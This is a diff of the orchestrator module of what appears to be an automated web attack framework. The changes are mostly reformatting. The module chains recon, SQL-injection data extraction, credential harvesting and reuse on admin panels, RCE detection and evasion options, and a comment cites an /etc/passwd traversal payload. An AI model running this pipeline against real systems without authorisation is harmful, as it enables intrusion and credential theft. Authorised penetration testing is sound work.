@@ -1,5 +1,4 @@
 import concurrent.futures
-import json
 import threading
 import time
 from typing import Any, Dict, List, Optional
@@ -8,6 +7,7 @@ from urllib.parse import urlparse
 import requests
 
 from tools.log_utils import get_logger
+from tools.output import progress
 from tools.session import build_session
 
 logger = get_logger("orchestrator")
@@ -31,6 +31,7 @@ from tools.orchestrator_engine.helpers import (
     HIGH_VALUE_DETECTORS,
     LOW_VALUE_DETECTORS,
 )
+from tools.orchestrator_engine.report_phase import ReportPhaseMixin
 
 __all__ = [
     "Orchestrator",
@@ -66,9 +67,19 @@ from tools.vuln_context import VulnContextStore as VulnContextMemory
 # 注意: 不要加入 "file" —— 它是最常见的 LFI / 任意文件读取 / 文件上传参数名
 # (?file=../../etc/passwd), 跳过它会让 orchestrator 永远测不到这类端点的注入.
 SKIP_PARAMS = {
-    "submit", "button", "reset", "image", "action",
-    "_method", "_token", "utf8", "commit", "form_id", "form_build_id",
-    "form_token", "authenticity_token",
+    "submit",
+    "button",
+    "reset",
+    "image",
+    "action",
+    "_method",
+    "_token",
+    "utf8",
+    "commit",
+    "form_id",
+    "form_build_id",
+    "form_token",
+    "authenticity_token",
 }
 # 无参数 URL 的占位参数名 (仅作为调度键，不会真正注入)
 SIGNATURE_PLACEHOLDER = "__placeholder__"
@@ -78,15 +89,24 @@ SIGNATURE_PLACEHOLDER = "__placeholder__"
 _PIVOT_HANDLERS: Dict[str, Any] = {}
 
 
-class Orchestrator:
-    def __init__(self, target: str,
-                 sess: Optional['requests.Session'] = None, timeout: float = 10.0,
-                 threads: int = 20, max_pages: int = 50, max_depth: int = 3,
-                 high_priv_sess: Optional['requests.Session'] = None,
-                 fast_recon: bool = True, time_budget: Optional[float] = None,
-                 high_value: bool = False, turbo: bool = False,
-                 skip_verify: bool = False, opsec: bool = False,
-                 endpoints: Optional[List[str]] = None):
+class Orchestrator(ReportPhaseMixin):
+    def __init__(
+        self,
+        target: str,
+        sess: Optional["requests.Session"] = None,
+        timeout: float = 10.0,
+        threads: int = 20,
+        max_pages: int = 50,
+        max_depth: int = 3,
+        high_priv_sess: Optional["requests.Session"] = None,
+        fast_recon: bool = True,
+        time_budget: Optional[float] = None,
+        high_value: bool = False,
+        turbo: bool = False,
+        skip_verify: bool = False,
+        opsec: bool = False,
+        endpoints: Optional[List[str]] = None,
+    ):
         # endpoints: 用户/agent 提供的额外种子端点 (URL 或 "URL PARAM").
         # 让 agent 把 Burp / 手工浏览发现的端点喂进流水线, 不再纯靠 crawl.
         self.seed_endpoints = list(endpoints or [])
@@ -95,14 +115,21 @@ class Orchestrator:
         # 若用带 query 的 self.target 拼接, `.../page?id=1` + "/x" 会得到
         # 畸形 URL `.../page?id=1/x`, 污染测试点与结果.
         _parsed = urlparse(self.target)
-        self.base_target = "%s://%s%s" % (
-            _parsed.scheme, _parsed.netloc, _parsed.path,
-        ) or self.target
+        self.base_target = (
+            "%s://%s%s"
+            % (
+                _parsed.scheme,
+                _parsed.netloc,
+                _parsed.path,
+            )
+            or self.target
+        )
         self.timeout = timeout
         # self.sess 必须非空: 检测/验证/武器化各层直接复用, 不再各自兜底 None.
-        self.sess: 'requests.Session' = sess if sess is not None else build_session()
+        self.sess: "requests.Session" = sess if sess is not None else build_session()
         if opsec:
             from tools.opsec_session import opsec_session
+
             self.sess = opsec_session(self.sess)
         self.high_priv_sess = high_priv_sess
         self.threads = threads if not turbo else min(threads * 3, 60)
@@ -142,16 +169,20 @@ class Orchestrator:
         self.verifier = SecondOrderVerifier(self.sess, timeout)
         self.vuln_ctx = VulnContextMemory()
         from tools.evasion_engine import EvasionEngine
+
         self.evasion = EvasionEngine()
         self._storage = None
         self._storage_name = "default"
+        self._resumed = False
 
     def init_storage(self, resume: bool = False, name: str = "default"):
         from tools.storage import SessionStore
+
         self._storage_name = name
         self._storage = SessionStore(name)
         self.context_memory.set_storage(self._storage)
         self.vuln_ctx.set_storage(self._storage)
+        self._resumed = bool(resume)
         if resume:
             self._resume_state()
 
@@ -163,7 +194,9 @@ class Orchestrator:
         vctx = self._storage.load_vuln_context()
         if vctx:
             self.vuln_ctx.restore(vctx)
-            logger.info("Resumed vuln_context (%d fields) from session %s", len(vctx), self._storage_name)
+            logger.info(
+                "Resumed vuln_context (%d fields) from session %s", len(vctx), self._storage_name
+            )
         phases = self._storage.load_all_phases()
         if phases:
             for ph, st in phases.items():
@@ -218,91 +251,113 @@ class Orchestrator:
             logger.debug("save findings: %s", e)
 
     def phase_recon(self) -> Dict:
-        print("[Recon] Phase 1/9: Reconnaissance ...")
+        progress("[Recon] Phase 1/9: Reconnaissance ...")
         recon = {"target": self.target}
 
-        print("  [Recon] Technology fingerprint ...")
+        progress("  [Recon] Technology fingerprint ...")
         recon["technologies"] = fingerprint_tech(self.target, self.sess, self.timeout)
         techs = recon["technologies"].get("technologies", [])
         if techs:
-            print("    -> %d technologies detected" % len(techs))
+            progress("    -> %d technologies detected" % len(techs))
             for t in techs[:10]:
-                print("      - %s" % t["name"])
+                progress("      - %s" % t["name"])
         else:
-            print("    -> No specific tech detected")
+            progress("    -> No specific tech detected")
 
-        print("  [Recon] Version fingerprint & CVE matching ...")
+        progress("  [Recon] Version fingerprint & CVE matching ...")
         try:
             version_info = fingerprint_target(self.target, self.sess, self.timeout)
             recon["version_info"] = version_info
             critical_versions = version_info.get("critical_versions", [])
             if critical_versions:
-                print("    -> %d critical versions with CVE matches:" % len(critical_versions))
+                progress("    -> %d critical versions with CVE matches:" % len(critical_versions))
                 for cv in critical_versions:
-                    print("      - %s %s: %s" % (cv["product"], cv["version"], ", ".join(cv["cves"][:3])))
+                    progress(
+                        "      - %s %s: %s"
+                        % (cv["product"], cv["version"], ", ".join(cv["cves"][:3]))
+                    )
             else:
-                print("    -> %d versions detected, no critical CVE matches" % version_info.get("total_versions", 0))
+                progress(
+                    "    -> %d versions detected, no critical CVE matches"
+                    % version_info.get("total_versions", 0)
+                )
         except Exception as e:
             logger.debug("version fingerprint: %s", e)
 
-        print("  [Recon] Quick port scan (top 100) ...")
+        progress("  [Recon] Quick port scan (top 100) ...")
         recon["open_ports"] = scan_ports(self.target, fast=self.fast_recon)
         open_count = recon["open_ports"].get("open_count", 0)
         if open_count:
-            print("    -> %d open ports" % open_count)
+            progress("    -> %d open ports" % open_count)
             for p in recon["open_ports"].get("open_ports", [])[:10]:
-                print("      - %d/%s (%s)" % (p["port"], p["service"], p["state"]))
+                progress("      - %d/%s (%s)" % (p["port"], p["service"], p["state"]))
         else:
-            print("    -> No obvious open ports")
+            progress("    -> No obvious open ports")
 
-        print("  [Recon] Git leak check ...")
+        progress("  [Recon] Git leak check ...")
         recon["git_leak"] = check_git_leak(self.target, self.sess, self.timeout, deep=False)
         if recon["git_leak"].get("git_exposed"):
             sf = len(recon["git_leak"].get("sensitive_finds", []))
-            print("    [CRITICAL] .git exposed! %d sensitive finds" % sf)
+            progress("    [CRITICAL] .git exposed! %d sensitive finds" % sf)
         else:
-            print("    -> No git exposure")
+            progress("    -> No git exposure")
 
-        print("  [Recon] Subdomain enumeration ...")
+        progress("  [Recon] Subdomain enumeration ...")
         try:
             from tools.recon.subdomain import COMMON_SUBDOMAINS
+
             wordlist = COMMON_SUBDOMAINS[:20] if self.fast_recon else COMMON_SUBDOMAINS
             recon["subdomains"] = enum_subdomains(
-                self.target, threads=min(10, max(1, self.threads)),
-                timeout=self.timeout, wordlist=wordlist,
+                self.target,
+                threads=min(10, max(1, self.threads)),
+                timeout=self.timeout,
+                wordlist=wordlist,
             )
             resolved_n = len(recon["subdomains"].get("resolved", []))
             reachable_n = len(recon["subdomains"].get("http_reachable", []))
             if resolved_n:
-                print("    -> %d subdomains resolved, %d HTTP-reachable" % (resolved_n, reachable_n))
+                progress(
+                    "    -> %d subdomains resolved, %d HTTP-reachable" % (resolved_n, reachable_n)
+                )
             else:
-                print("    -> No subdomains resolved")
+                progress("    -> No subdomains resolved")
         except Exception as e:
             logger.debug("subdomain enum: %s", e)
             recon["subdomains"] = {}
 
-        print("  [Recon] Directory fuzzing (common paths) ...")
+        progress("  [Recon] Directory fuzzing (common paths) ...")
         recon["directories"] = fuzz_directories(
-            self.target, sess=self.sess, timeout=self.timeout,
+            self.target,
+            sess=self.sess,
+            timeout=self.timeout,
             follow_redirects=False,
         )
         interesting = recon["directories"].get("interesting", [])
         if interesting:
-            print("    -> %d interesting paths" % len(interesting))
+            progress("    -> %d interesting paths" % len(interesting))
             for d in interesting[:8]:
-                print("      - %s [%d] (%d bytes)" % (
-                    d["path"], d["status"], d["size"]))
+                progress("      - %s [%d] (%d bytes)" % (d["path"], d["status"], d["size"]))
         else:
-            print("    -> No interesting paths found")
+            progress("    -> No interesting paths found")
 
-        print("  [Recon] Debug/actuator endpoint probe ...")
+        progress("  [Recon] Debug/actuator endpoint probe ...")
         debug_paths = [
-            "/actuator", "/actuator/health", "/actuator/env",
-            "/.env", "/debug", "/api/debug", "/console",
-            "/h2-console", "/api/health", "/api/env",
+            "/actuator",
+            "/actuator/health",
+            "/actuator/env",
+            "/.env",
+            "/debug",
+            "/api/debug",
+            "/console",
+            "/h2-console",
+            "/api/health",
+            "/api/env",
         ]
         debug_found = []
-        with concurrent.futures.ThreadPoolExecutor(max_workers=min(10, max(1, self.threads))) as dex:
+        with concurrent.futures.ThreadPoolExecutor(
+            max_workers=min(10, max(1, self.threads))
+        ) as dex:
+
             def _probe(dp):
                 try:
                     r = self.sess.get(self.target.rstrip("/") + dp, timeout=self.timeout)
@@ -311,22 +366,23 @@ class Orchestrator:
                 except Exception:
                     pass
                 return None
+
             debug_found = [f for f in dex.map(_probe, debug_paths) if f]
         if debug_found:
-            print("    -> %d debug/actuator endpoints found" % len(debug_found))
+            progress("    -> %d debug/actuator endpoints found" % len(debug_found))
             for d in debug_found:
-                print("      - %s [%d] (%d bytes)" % (d["path"], d["status"], d["size"]))
+                progress("      - %s [%d] (%d bytes)" % (d["path"], d["status"], d["size"]))
             self.vuln_ctx.update(has_debug_mode=True)
             self.vuln_ctx.update(debug_endpoints=[d["path"] for d in debug_found])
         else:
-            print("    -> No debug endpoints detected")
+            progress("    -> No debug endpoints detected")
 
         self.state["phases"]["recon"] = recon
         self._save_phase("recon")
         return recon
 
     def phase_attack_plan(self) -> Dict:
-        print("[Recon] Building attack plan from recon results ...")
+        progress("[Recon] Building attack plan from recon results ...")
         recon = self.state["phases"].get("recon", {})
 
         flat_techs = recon.get("technologies", {}).get("technologies", [])
@@ -342,8 +398,10 @@ class Orchestrator:
         plan = build_attack_plan(plan_input)
 
         if plan["phases"]:
-            print("  -> Attack plan: %d phases, risk score=%d" % (
-                len(plan["phases"]), plan["risk_score"]))
+            progress(
+                "  -> Attack plan: %d phases, risk score=%d"
+                % (len(plan["phases"]), plan["risk_score"])
+            )
             for ph in plan["phases"][:5]:
                 risk = ph.get("risk", "?")
                 detail = ""
@@ -353,9 +411,9 @@ class Orchestrator:
                     detail = "port %d/%s" % (ph["port"], ph.get("module", "?"))
                 elif "detectors" in ph:
                     detail = ", ".join(ph["detectors"][:5])
-                print("    [%s] %s: %s" % (risk, ph.get("phase", "?"), detail))
+                progress("    [%s] %s: %s" % (risk, ph.get("phase", "?"), detail))
         else:
-            print("  -> No attack plan generated, falling back to generic")
+            progress("  -> No attack plan generated, falling back to generic")
 
         self.attack_plan = plan
         self.state["phases"]["attack_plan"] = plan
@@ -363,7 +421,7 @@ class Orchestrator:
         return plan
 
     def phase_reason(self) -> List[Dict]:
-        print("[Reason] Phase 1b/9: Hypothesis-driven reasoning ...")
+        progress("[Reason] Phase 1b/9: Hypothesis-driven reasoning ...")
         recon = self.state["phases"].get("recon", {})
         plan = self.attack_plan or {}
         crawl_data = self.state["phases"].get("crawl", {})
@@ -383,56 +441,71 @@ class Orchestrator:
         self.last_hypotheses = self.reasoner.correlate_hypotheses(hypotheses)
 
         if hypotheses:
-            print("  -> %d hypotheses generated (%d after correlation):" % (
-                len(hypotheses), len(self.last_hypotheses)))
+            progress(
+                "  -> %d hypotheses generated (%d after correlation):"
+                % (len(hypotheses), len(self.last_hypotheses))
+            )
             for h in self.last_hypotheses[:8]:
                 stars = "*" if h.priority == 0 else ""
                 cve_tag = ""
                 if h.detail.get("cve_ids") or h.detail.get("matched_cves"):
                     ids = h.detail.get("matched_cves", h.detail.get("cve_ids", []))
                     cve_tag = " [%s]" % ", ".join(ids[:2])
-                print("    %s [p=%d] %.0f%% %s%s" % (stars, h.priority, h.confidence * 100, h.vuln_type, cve_tag))
+                progress(
+                    "    %s [p=%d] %.0f%% %s%s"
+                    % (stars, h.priority, h.confidence * 100, h.vuln_type, cve_tag)
+                )
                 if h.evidence:
-                    print("      evidence: %s" % h.evidence[0][:120])
+                    progress("      evidence: %s" % h.evidence[0][:120])
                 if h.suggested_chain:
-                    print("      chain: %s" % h.suggested_chain)
+                    progress("      chain: %s" % h.suggested_chain)
         else:
-            print("  -> No specific hypotheses, falling back to broad scan")
+            progress("  -> No specific hypotheses, falling back to broad scan")
 
         attack_tree = self.reasoner.build_attack_tree(context)
         self.attack_tree = attack_tree
         paths = attack_tree.best_paths(min_confidence=0.20)
         if paths:
-            print("  -> Attack tree: %d nodes, top paths:" % len(attack_tree.nodes))
+            progress("  -> Attack tree: %d nodes, top paths:" % len(attack_tree.nodes))
             for path in paths[:4]:
-                print("    %.0f%% %s" % (path["confidence"] * 100, path["path_string"]))
+                progress("    %.0f%% %s" % (path["confidence"] * 100, path["path_string"]))
                 if path["chain"]:
-                    print("      → %s" % path["chain"])
+                    progress("      → %s" % path["chain"])
 
         hypo_dicts = [h.to_dict() for h in self.last_hypotheses]
         self.state["phases"]["reason"] = {
-            "hypotheses": hypo_dicts, "count": len(self.last_hypotheses),
+            "hypotheses": hypo_dicts,
+            "count": len(self.last_hypotheses),
             "attack_tree": attack_tree.summary(),
         }
 
         # Build attack graph (enhanced attack tree with cycle support)
-        print("[Reason] Building attack graph ...")
+        progress("[Reason] Building attack graph ...")
         self.attack_graph = build_attack_graph(context, self.target)
         graph_summary = self.attack_graph.summary()
-        print("  -> Attack graph: %d nodes, %d edges, %d goals" % (
-            graph_summary["total_nodes"], graph_summary["total_edges"],
-            len(graph_summary["goals"])))
+        progress(
+            "  -> Attack graph: %d nodes, %d edges, %d goals"
+            % (
+                graph_summary["total_nodes"],
+                graph_summary["total_edges"],
+                len(graph_summary["goals"]),
+            )
+        )
         for path in graph_summary.get("best_paths", [])[:3]:
-            print("    %.0f%% %s" % (path["confidence"] * 100, path["path_string"]))
+            progress("    %.0f%% %s" % (path["confidence"] * 100, path["path_string"]))
 
         self.state["phases"]["reason"]["attack_graph"] = graph_summary
         self._save_phase("reason")
         return hypo_dicts
 
     def phase_crawl(self) -> Dict:
-        result = crawler.crawl(self.target, max_depth=self.max_depth,
-                                max_pages=self.max_pages, sess=self.sess,
-                                timeout=self.timeout)
+        result = crawler.crawl(
+            self.target,
+            max_depth=self.max_depth,
+            max_pages=self.max_pages,
+            sess=self.sess,
+            timeout=self.timeout,
+        )
         self.state["phases"]["crawl"] = result
         self._save_phase("crawl")
         return result
@@ -443,8 +516,7 @@ class Orchestrator:
         endpoints = crawl_result.get("endpoints", {})
         if not endpoints:
             endpoints = {"/": {"url": self.target, "methods": ["GET"], "params": []}}
-        result = param_miner.mine(self.target, endpoints, self.sess,
-                                    self.timeout, self.threads)
+        result = param_miner.mine(self.target, endpoints, self.sess, self.timeout, self.threads)
         self.state["phases"]["param_mine"] = result
         self._save_phase("param_mine")
         return result
@@ -482,7 +554,7 @@ class Orchestrator:
         filtered = [d for d in detectors if d in HIGH_VALUE_DETECTORS]
         skipped = set(detectors) - set(filtered)
         if skipped:
-            print("  [high-value] skipped low-impact detectors: %s" % ", ".join(sorted(skipped)))
+            progress("  [high-value] skipped low-impact detectors: %s" % ", ".join(sorted(skipped)))
         return filtered
 
     def _build_test_points(self) -> List[Dict]:
@@ -523,10 +595,18 @@ class Orchestrator:
             get_mined = set()
             post_mined = set()
             for p in pd.get("get_params", []):
-                if isinstance(p, dict) and p.get("status", 404) not in (0, 404, 400) and isinstance(p.get("param"), str):
+                if (
+                    isinstance(p, dict)
+                    and p.get("status", 404) not in (0, 404, 400)
+                    and isinstance(p.get("param"), str)
+                ):
                     get_mined.add(p["param"])
             for p in pd.get("post_params", []):
-                if isinstance(p, dict) and p.get("status", 404) not in (0, 404, 400) and isinstance(p.get("param"), str):
+                if (
+                    isinstance(p, dict)
+                    and p.get("status", 404) not in (0, 404, 400)
+                    and isinstance(p.get("param"), str)
+                ):
                     post_mined.add(p["param"])
             for p in get_mined:
                 if p.lower() in SKIP_PARAMS:
@@ -541,29 +621,61 @@ class Orchestrator:
                 key = "%s|%s|POST" % (url, p)
                 if key not in seen:
                     seen.add(key)
-                    points.append({"url": url, "param": p, "method": "POST",
-                                   "post_data": {p: "1"}})
+                    points.append({"url": url, "param": p, "method": "POST", "post_data": {p: "1"}})
 
-        dirs = self.state.get("phases", {}).get("recon", {}).get("directories", {}).get("interesting", [])
+        dirs = (
+            self.state.get("phases", {})
+            .get("recon", {})
+            .get("directories", {})
+            .get("interesting", [])
+        )
         for d in dirs[:20]:
             full_url = self.base_target.rstrip("/") + d["path"]
             key = "%s|%s|GET" % (full_url, SIGNATURE_PLACEHOLDER)
             if key not in seen:
                 seen.add(key)
-                points.append({"url": full_url, "param": SIGNATURE_PLACEHOLDER, "method": "GET", "from_recon": True})
+                points.append(
+                    {
+                        "url": full_url,
+                        "param": SIGNATURE_PLACEHOLDER,
+                        "method": "GET",
+                        "from_recon": True,
+                    }
+                )
 
         js_apis = crawl_data.get("js_api_endpoints", [])
         for api_path in js_apis:
-            full_url = api_path if api_path.startswith("http") else "%s%s" % (self.base_target, api_path)
+            full_url = (
+                api_path if api_path.startswith("http") else "%s%s" % (self.base_target, api_path)
+            )
             key = "%s|%s|GET" % (full_url, SIGNATURE_PLACEHOLDER)
             if key not in seen:
                 seen.add(key)
-                points.append({"url": full_url, "param": SIGNATURE_PLACEHOLDER, "method": "GET", "from_js": True})
-            for param_guess in ["id", "page", "q", "token", "key", "limit", "offset", "filter", "search"]:
+                points.append(
+                    {
+                        "url": full_url,
+                        "param": SIGNATURE_PLACEHOLDER,
+                        "method": "GET",
+                        "from_js": True,
+                    }
+                )
+            for param_guess in [
+                "id",
+                "page",
+                "q",
+                "token",
+                "key",
+                "limit",
+                "offset",
+                "filter",
+                "search",
+            ]:
                 pk = "%s|%s|GET" % (full_url, param_guess)
                 if pk not in seen:
                     seen.add(pk)
-                    points.append({"url": full_url, "param": param_guess, "method": "GET", "from_js": True})
+                    points.append(
+                        {"url": full_url, "param": param_guess, "method": "GET", "from_js": True}
+                    )
 
         plan = self.attack_plan
         if plan:
@@ -574,9 +686,22 @@ class Orchestrator:
                         key = "%s|%s|GET" % (full_url, SIGNATURE_PLACEHOLDER)
                         if key not in seen:
                             seen.add(key)
-                            points.append({"url": full_url, "param": SIGNATURE_PLACEHOLDER, "method": "GET", "from_plan": True})
+                            points.append(
+                                {
+                                    "url": full_url,
+                                    "param": SIGNATURE_PLACEHOLDER,
+                                    "method": "GET",
+                                    "from_plan": True,
+                                }
+                            )
 
-        techs = [t.get("id", "") for t in self.state.get("phases", {}).get("recon", {}).get("technologies", {}).get("technologies", [])]
+        techs = [
+            t.get("id", "")
+            for t in self.state.get("phases", {})
+            .get("recon", {})
+            .get("technologies", {})
+            .get("technologies", [])
+        ]
         if techs:
             for p in points:
                 score = self.reasoner.score_endpoint(p["param"], techs)
@@ -632,10 +757,15 @@ class Orchestrator:
             if key in seen:
                 continue
             seen.add(key)
-            seeded.append({
-                "url": base_url, "param": param, "method": "GET",
-                marker: True, "_score": 1.0,
-            })
+            seeded.append(
+                {
+                    "url": base_url,
+                    "param": param,
+                    "method": "GET",
+                    marker: True,
+                    "_score": 1.0,
+                }
+            )
         return seeded
 
     def _seed_points_from_endpoints(self, seen: set) -> List[Dict]:
@@ -663,10 +793,15 @@ class Orchestrator:
                 if key in seen:
                     continue
                 seen.add(key)
-                points.append({
-                    "url": base, "param": param, "method": "GET",
-                    "from_endpoints": True, "_score": 1.0,
-                })
+                points.append(
+                    {
+                        "url": base,
+                        "param": param,
+                        "method": "GET",
+                        "from_endpoints": True,
+                        "_score": 1.0,
+                    }
+                )
             else:
                 points.extend(self._seed_points_from_url(parts[0], seen, "from_endpoints"))
         return points
@@ -697,37 +832,56 @@ class Orchestrator:
 
         from tools.chain_engine import ChainEngine
         from tools.orchestrator_engine.chains import by_vtype
+
         chain = ChainEngine(self.sess, self.timeout)
 
         vtype_to_chain = by_vtype(chain)
 
         if vtype in vtype_to_chain and self._budget_ok(10):
             cname, cfn = vtype_to_chain[vtype]
-            print("\n    [Backtrack] %s on %s?%s — running %s NOW" % (vtype.upper(), url, param, cname))
+            progress(
+                "\n    [Backtrack] %s on %s?%s — running %s NOW"
+                % (vtype.upper(), url, param, cname)
+            )
             try:
                 r = cfn(url, param)
                 self._chain_cache[chain_key] = r
                 if r.get("success"):
-                    print("      [CRITICAL] Chain %s confirmed mid-scan!" % cname)
+                    progress("      [CRITICAL] Chain %s confirmed mid-scan!" % cname)
                     if r.get("credentials_extracted"):
-                        print("      [CREDENTIAL] %s" % r["credentials_extracted"][:3])
+                        progress("      [CREDENTIAL] %s" % r["credentials_extracted"][:3])
                     if r.get("rce_available"):
-                        print("      [RCE] %s" % r.get("rce_method", "?"))
+                        progress("      [RCE] %s" % r.get("rce_method", "?"))
                 return r
             except Exception as e:
                 logger.debug("backtrack chain %s: %s", cname, e)
 
         return None
 
-    def _cross_verify(self, vtype: str, url: str, param: str,
-                       waf_name: str, oob: dict, first_result: dict,
-                       post_data: Optional[dict] = None,
-                       method: str = "GET") -> dict:
+    def _cross_verify(
+        self,
+        vtype: str,
+        url: str,
+        param: str,
+        waf_name: str,
+        oob: dict,
+        first_result: dict,
+        post_data: Optional[dict] = None,
+        method: str = "GET",
+    ) -> dict:
         """独立复验: 委托给 test_runner.cross_verify (薄包装, 保留向后兼容)."""
         return test_runner.cross_verify(
-            vtype, url, param, waf_name, oob, first_result,
-            oracle=self.oracle, sess=self.sess, timeout=self.timeout,
-            post_data=post_data, method=method,
+            vtype,
+            url,
+            param,
+            waf_name,
+            oob,
+            first_result,
+            oracle=self.oracle,
+            sess=self.sess,
+            timeout=self.timeout,
+            post_data=post_data,
+            method=method,
         )
 
     def _backtrack_loop_closure(self, chain_result: dict, finding: dict) -> None:
@@ -744,40 +898,64 @@ class Orchestrator:
         vtype = finding.get("type", "").lower()
 
         if creds:
-            print("    [Loop] %d credentials recovered — probing stored services" % len(creds))
+            progress("    [Loop] %d credentials recovered — probing stored services" % len(creds))
             for cred in creds[:5]:
                 self.state.setdefault("recovered_credentials", []).append(cred)
 
         if rce:
-            print("    [Loop] RCE achieved via %s — marking attack surface" % vtype)
-            self.state.setdefault("exploits", []).append({
-                "source": vtype,
-                "type": "rce",
-                "url": finding.get("url", ""),
-                "credential_count": len(creds),
-                "chain_result": chain_result.get("rce_method", "unknown"),
-            })
+            progress("    [Loop] RCE achieved via %s — marking attack surface" % vtype)
+            self.state.setdefault("exploits", []).append(
+                {
+                    "source": vtype,
+                    "type": "rce",
+                    "url": finding.get("url", ""),
+                    "credential_count": len(creds),
+                    "chain_result": chain_result.get("rce_method", "unknown"),
+                }
+            )
 
         if vtype == "sqli" and creds:
             for c in creds:
                 if ":" in c or "@" in c:
-                    print("    [Loop] Credential format %s — will try on discovered admin panels" %
-                          c.split(":")[0] if ":" in c else c.split("@")[0])
+                    progress(
+                        "    [Loop] Credential format %s — will try on discovered admin panels"
+                        % c.split(":")[0]
+                        if ":" in c
+                        else c.split("@")[0]
+                    )
                     self.state.setdefault("admin_creds", []).append(c)
 
-    def _run_detector(self, vtype: str, url: str, param: str,
-                      waf_name: Optional[str], oob: dict,
-                      effective_timeout: float, post_data: Optional[dict] = None,
-                      method: str = "GET") -> Optional[Dict]:
+    def _run_detector(
+        self,
+        vtype: str,
+        url: str,
+        param: str,
+        waf_name: Optional[str],
+        oob: dict,
+        effective_timeout: float,
+        post_data: Optional[dict] = None,
+        method: str = "GET",
+    ) -> Optional[Dict]:
         return test_runner.run_detector(
-            vtype, url, param, self.sess, waf_name, oob,
-            effective_timeout, post_data=post_data, method=method,
+            vtype,
+            url,
+            param,
+            self.sess,
+            waf_name,
+            oob,
+            effective_timeout,
+            post_data=post_data,
+            method=method,
         )
 
-    def _test_single_point(self, point: Dict, active_detectors: List[str],
-                           waf_name: Optional[str] = None,
-                           oob_url: Optional[str] = None,
-                           oob_domain: Optional[str] = None) -> List[Dict]:
+    def _test_single_point(
+        self,
+        point: Dict,
+        active_detectors: List[str],
+        waf_name: Optional[str] = None,
+        oob_url: Optional[str] = None,
+        oob_domain: Optional[str] = None,
+    ) -> List[Dict]:
         waf_name = waf_name or ""
         if not self._budget_ok(2):
             return []
@@ -809,8 +987,17 @@ class Orchestrator:
             raw_results = []
             with concurrent.futures.ThreadPoolExecutor(max_workers=det_workers) as dex:
                 futures = {
-                    dex.submit(self._run_detector, vt, url, param, waf_name, oob,
-                               effective_timeout, post_data, method): vt
+                    dex.submit(
+                        self._run_detector,
+                        vt,
+                        url,
+                        param,
+                        waf_name,
+                        oob,
+                        effective_timeout,
+                        post_data,
+                        method,
+                    ): vt
                     for vt in eligible
                 }
                 for future in concurrent.futures.as_completed(futures):
@@ -829,8 +1016,9 @@ class Orchestrator:
             for vtype in eligible:
                 if not self._budget_ok(2):
                     break
-                r = self._run_detector(vtype, url, param, waf_name, oob,
-                                       effective_timeout, post_data, method)
+                r = self._run_detector(
+                    vtype, url, param, waf_name, oob, effective_timeout, post_data, method
+                )
                 if r:
                     raw_results.append(r)
 
@@ -845,8 +1033,9 @@ class Orchestrator:
 
             vuln = r.get("vulnerable") or r.get("total_bypasses", 0) > 0
             if vuln and not self.skip_verify and self._budget_ok(5):
-                r = self._cross_verify(vtype, url, param, waf_name, oob, r,
-                                       post_data=post_data, method=method)
+                r = self._cross_verify(
+                    vtype, url, param, waf_name, oob, r, post_data=post_data, method=method
+                )
                 vuln = r.get("confirmed", vuln)
             if vuln:
                 if vtype in ("sqlcheck", "sql_injection", "cmdi", "ssrf", "deser"):
@@ -858,7 +1047,9 @@ class Orchestrator:
                     verified["verified"] = True
                     oracle_confidence = native_confidence
                 else:
-                    verified = self.oracle.verify(vtype, r, url, param, self.sess or build_session(), self.timeout)
+                    verified = self.oracle.verify(
+                        vtype, r, url, param, self.sess or build_session(), self.timeout
+                    )
                     oracle_confidence = verified.get("confidence_score", 0.0)
 
                 if verified.get("verified") is not False:
@@ -878,15 +1069,20 @@ class Orchestrator:
 
                     if not self.skip_verify:
                         from tools.false_positive_filter import FalsePositiveFilter
+
                         fpf = FalsePositiveFilter(self.profiler)
                         finding = fpf.filter_single(finding)
 
                     if not finding.get("filtered", False):
                         if not self.skip_verify:
-                            rv = robust_verify(vtype, url, param, self.sess, self.timeout, self.oob_server)
+                            rv = robust_verify(
+                                vtype, url, param, self.sess, self.timeout, self.oob_server
+                            )
                             if rv.get("vulnerable"):
                                 finding["robust_verified"] = True
-                                finding["confidence_score"] = max(finding.get("confidence_score", 0), rv["confidence"])
+                                finding["confidence_score"] = max(
+                                    finding.get("confidence_score", 0), rv["confidence"]
+                                )
                                 finding["robust_check"] = rv
                                 if rv.get("dbms"):
                                     finding["dbms"] = rv["dbms"]
@@ -923,7 +1119,9 @@ class Orchestrator:
                             if cross.get("vulnerable"):
                                 finding["cross_validated"] = True
                                 finding["cross_checks"] = cross.get("cross_checks", {})
-                                finding["confidence_score"] = max(finding.get("confidence_score", 0), cross.get("confidence", 0))
+                                finding["confidence_score"] = max(
+                                    finding.get("confidence_score", 0), cross.get("confidence", 0)
+                                )
                                 if cross.get("rce_available"):
                                     finding["rce_available"] = True
 
@@ -931,15 +1129,21 @@ class Orchestrator:
                             # 盲注/union 提取开销大，受时间预算约束，超预算则跳过
                             if self._budget_ok(12):
                                 try:
-                                    union_probe = sqli_union_probe(url, param, self.sess, self.timeout)
+                                    union_probe = sqli_union_probe(
+                                        url, param, self.sess, self.timeout
+                                    )
                                     if union_probe.get("vulnerable"):
                                         finding["sql_columns"] = union_probe.get("columns")
-                                        finding["sql_usable_columns"] = union_probe.get("usable_columns")
+                                        finding["sql_usable_columns"] = union_probe.get(
+                                            "usable_columns"
+                                        )
                                 except Exception:
                                     pass
                             if self._budget_ok(20):
                                 try:
-                                    blind_data = binary_search_sqli_blind(url, param, self.sess, self.timeout)
+                                    blind_data = binary_search_sqli_blind(
+                                        url, param, self.sess, self.timeout
+                                    )
                                     if blind_data.get("extracted"):
                                         finding["blind_extracted"] = blind_data["extracted"]
                                 except Exception:
@@ -1024,7 +1228,9 @@ class Orchestrator:
             if vtype == "jwt" and result.get("tokens_found"):
                 for token_info in result["tokens_found"][:1]:
                     if token_info.get("token"):
-                        self.context_memory.set("session_token", token_info["token"], "jwt_detector", 0.70)
+                        self.context_memory.set(
+                            "session_token", token_info["token"], "jwt_detector", 0.70
+                        )
 
         # Store OS type from port scan
         ports = recon.get("open_ports", {})
@@ -1050,7 +1256,9 @@ class Orchestrator:
         if vc.ssrf_cloud_creds:
             self.context_memory.set("cloud_creds", vc.ssrf_cloud_creds, "vuln_context", 0.90)
         if vc.lfi_readable_paths:
-            self.context_memory.set("lfi_readable_paths", vc.lfi_readable_paths, "vuln_context", 0.85)
+            self.context_memory.set(
+                "lfi_readable_paths", vc.lfi_readable_paths, "vuln_context", 0.85
+            )
         if vc.debug_endpoints:
             self.context_memory.set("debug_endpoints", vc.debug_endpoints, "vuln_context", 0.85)
         if vc.discovered_versions:
@@ -1070,7 +1278,7 @@ class Orchestrator:
